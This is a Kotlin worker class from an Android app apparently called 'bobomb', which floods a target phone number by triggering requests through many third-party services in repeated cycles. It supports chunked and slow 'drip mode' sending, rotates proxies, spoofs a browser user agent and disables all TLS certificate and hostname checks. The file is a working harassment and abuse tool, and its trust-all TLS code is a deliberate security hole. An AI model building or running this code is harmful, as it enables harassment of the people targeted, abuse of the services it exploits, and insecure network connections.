package org.gooseprjkt.bobomb.worker

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.os.bundleOf
import androidx.work.Data
import androidx.work.Worker
import androidx.work.WorkerParameters
import org.gooseprjkt.bobomb.R
import org.gooseprjkt.bobomb.services.collectAll
import org.gooseprjkt.bobomb.services.core.Callback
import org.gooseprjkt.bobomb.services.core.Phone
import org.gooseprjkt.bobomb.services.filter
import org.gooseprjkt.bobomb.ui.MainActivity
import org.gooseprjkt.bobomb.ui.MainRepository
import org.gooseprjkt.bobomb.ui.MainViewModel
import okhttp3.Call
import okhttp3.Interceptor
import okhttp3.OkHttpClient
import okhttp3.Response
import java.io.IOException
import java.security.KeyManagementException
import java.security.NoSuchAlgorithmException
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import javax.net.ssl.SSLContext
import javax.net.ssl.SSLSession
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import kotlin.math.min

class AttackWorker(
    context: Context,
    workerParams: WorkerParameters
) : Worker(
    context,
    workerParams
) {
    private var tasks: CountDownLatch? = null

    @SuppressLint("CustomX509TrustManager", "TrustAllX509TrustManager")
    private val trustAllCerts = arrayOf<TrustManager>(
        object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> {
                return arrayOf()
            }
        }
    )

    private var notificationsGranted = true

    override fun doWork(): Result {
        setProgressAsync(
            Data.Builder()
                .putInt(MainViewModel.KEY_PROGRESS, 0)
                .putInt(MainViewModel.KEY_MAX_PROGRESS, 0)
                .build()
        )

        val repository = MainRepository(applicationContext)

        try {
            val sslContext = SSLContext.getInstance("SSL")
            sslContext.init(null, trustAllCerts, SecureRandom())
            clientBuilder.sslSocketFactory(sslContext.socketFactory, trustAllCerts[0] as X509TrustManager)
            clientBuilder.hostnameVerifier { _: String?, _: SSLSession? -> true }
        } catch (e: KeyManagementException) {
            e.printStackTrace()
        } catch (e: NoSuchAlgorithmException) {
            e.printStackTrace()
        }

        var client: OkHttpClient = clientBuilder.build()

        val proxies = if (inputData.getBoolean(KEY_PROXY_ENABLED, false))
            repository.proxy else ArrayList()

        val phone = Phone(
            inputData.getString(KEY_COUNTRY_CODE)!!,
            inputData.getString(KEY_PHONE)!!
        )

        val repeats = inputData.getInt(KEY_REPEATS, 1)
        val chunkSize = inputData.getInt(KEY_CHUNK_SIZE, 10)
        val dripModeEnabled = inputData.getBoolean(KEY_DRIP_MODE, false)
        val dripDelayMs = inputData.getLong(KEY_DRIP_DELAY_MS, 1200000L)

        val allServices = collectAll(repository.getAllRepositories(client)) { _, _, _ ->

        }

        val usableServices = allServices.filter(phone.countryCode).toMutableList()

        val fakeServices = inputData.getBoolean(KEY_FAKE_SERVICES, false)

        if (fakeServices) {
            repeat(usableServices.size) {
                usableServices.removeAt(0)
                usableServices.add(FakeService())
            }
        }

        Log.i(TAG, "Starting attack on +$phone (dripMode=$dripModeEnabled, delay=${dripDelayMs}ms, chunkSize=$chunkSize)")

        client =
            client.newBuilder()
                .proxy(null)
                .build()

        val notificationManager = NotificationManagerCompat.from(applicationContext)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            notificationsGranted = ActivityCompat.checkSelfPermission(
                applicationContext,
                Manifest.permission.POST_NOTIFICATIONS
            ) == PackageManager.PERMISSION_GRANTED
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name: CharSequence = applicationContext.getString(R.string.attack)
            val description = applicationContext.getString(R.string.channel_description)
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance)
            channel.description = description
            notificationManager.createNotificationChannel(channel)
        }

        var cycle = 0
        var progress = 0
        
        Log.i(TAG, "Total services for $phone: ${usableServices.size}, cycles: $repeats")

        while (cycle < repeats) {
            Log.i(TAG, "Starting cycle $cycle/${repeats}")

            if (proxies.isNotEmpty()) {
                val authProxy = proxies[cycle % proxies.size]
                client =
                    client.newBuilder()
                        .proxy(authProxy)
                        .proxyAuthenticator(authProxy)
                        .build()
                Log.d(TAG, "Using proxy for cycle $cycle")
            }

            if (dripModeEnabled) {
                Log.d(TAG, "Running in DRIP MODE with ${dripDelayMs}ms delay")
                for ((index, service) in usableServices.withIndex()) {
                    if (isStopped) {
                        Log.i(TAG, "Attack stopped by user at cycle $cycle, service $index")
                        cycle = repeats
                        break
                    }

                    try {
                        val latch = CountDownLatch(1)
                        var serviceError: Exception? = null
                        
                        service.run(client, object : Callback {
                            override fun onError(call: Call, e: Exception) {
                                Log.e(TAG, "Service ${index}/${usableServices.size} error: ${e.message}")
                                serviceError = e
                                latch.countDown()
                            }

                            @SuppressLint("MissingPermission")
                            override fun onResponse(call: Call, response: Response) {
                                Log.d(TAG, "Service ${index}/${usableServices.size} response: ${response.code}")
                                response.close()
                                
                                // Update progress and notification
                                updateProgressAndNotification(phone, usableServices.size, repeats, progress, notificationManager)
                                
                                latch.countDown()
                            }
                        }, phone)

                        // Wait for service with timeout (10 seconds)
                        if (!latch.await(10, TimeUnit.SECONDS)) {
                            Log.w(TAG, "Service ${index}/${usableServices.size} timed out, skipping...")
                        }
                        
                    } catch (e: Exception) {
                        Log.e(TAG, "Service ${index}/${usableServices.size} crashed: ${e.message}", e)
                        // Continue to next service instead of crashing the whole attack
                    }

                    progress++

                    if (index < usableServices.size - 1) {
                        Thread.sleep(dripDelayMs)
                    }
                }
            } else {
                for ((index, service) in usableServices.withIndex()) {
                    if (index % chunkSize == 0) {
                        if (tasks != null)
                            try {
                                tasks?.await()
                            } catch (e: InterruptedException) {
                                e.printStackTrace()
                            }

                        tasks = CountDownLatch(
                            min((usableServices.size - index), chunkSize)
                        )
                    }

                    if (isStopped) {
                        cycle = repeats
                        break
                    }

                    try {
                        service.run(client, object : Callback {
                            override fun onError(call: Call, e: Exception) {
                                Log.e(TAG, "Service ${index}/${usableServices.size} error: ${e.message}")
                                tasks?.countDown()
                            }

                            @SuppressLint("MissingPermission")
                            override fun onResponse(call: Call, response: Response) {
                                updateProgressAndNotification(phone, usableServices.size, repeats, progress++, notificationManager)
                                tasks?.countDown()
                            }
                        }, phone)
                    } catch (e: Exception) {
                        Log.e(TAG, "Service ${index}/${usableServices.size} crashed: ${e.message}", e)
                        tasks?.countDown()
                        progress++
                    }
                }
            }

            cycle++
        }

        try {
            if (!isStopped)
                tasks?.await()
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }

        notificationManager.cancel(id.hashCode())

        val mainRepository = MainRepository(applicationContext)
        mainRepository.addRecentNumber("$phone")

        Log.i(TAG, "Attack ended +$phone")
        return Result.success()
    }

    @SuppressLint("MissingPermission")
    private fun updateProgressAndNotification(phone: Phone, totalServices: Int, repeats: Int, progress: Int, notificationManager: NotificationManagerCompat) {
        val intent = Intent(applicationContext, MainActivity::class.java)
        intent.putExtra(MainActivity.TASK_ID, id.toString())

        val stackBuilder = TaskStackBuilder.create(applicationContext).apply {
            addParentStack(MainActivity::class.java)
            addNextIntent(intent)
        }

        val pendingIntent = stackBuilder.getPendingIntent(
            0,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else
                PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
            .setContentTitle(applicationContext.getString(R.string.attack))
            .setContentText("+$phone")
            .setProgress(totalServices * repeats, progress, false)
            .setOngoing(true)
            .setSmallIcon(R.drawable.bobomb_logo)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .addAction(R.drawable.ic_stop, applicationContext.getString(R.string.stop), pendingIntent)
            .build()

        notification.flags = notification.flags or Notification.FLAG_ONGOING_EVENT

        if (notificationsGranted)
            notificationManager.notify(id.hashCode(), notification)

        setProgressAsync(
            Data.Builder()
                .putInt(MainViewModel.KEY_PROGRESS, progress)
                .putInt(MainViewModel.KEY_MAX_PROGRESS, totalServices * repeats)
                .build()
        )
    }

    companion object {
        private const val TAG = "Attack"

        private const val USER_AGENT =
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37"

        const val KEY_COUNTRY_CODE = "country_code"
        const val KEY_PHONE = "phone"
        const val KEY_REPEATS = "repeats"
        const val KEY_PROXY_ENABLED = "proxy_enabled"
        const val KEY_FAKE_SERVICES = "fake_services"
        const val KEY_CHUNK_SIZE = "chunk_size"
        const val KEY_DRIP_MODE = "drip_mode"
        const val KEY_DRIP_DELAY_MS = "drip_delay_ms"

        private const val CHANNEL_ID = "attack"

        private val clientBuilder: OkHttpClient.Builder = OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(10, TimeUnit.SECONDS)
            .writeTimeout(10, TimeUnit.SECONDS)
            .callTimeout(10, TimeUnit.SECONDS)
            .addInterceptor(UserAgentInterceptor(USER_AGENT))
            .addInterceptor(LoggingInterceptor())
            .addInterceptor(Interceptor { chain: Interceptor.Chain ->
                try {
                    chain.proceed(chain.request())
                } catch (e: Exception) {
                    throw IOException(e.message)
                }
            })
    }
}
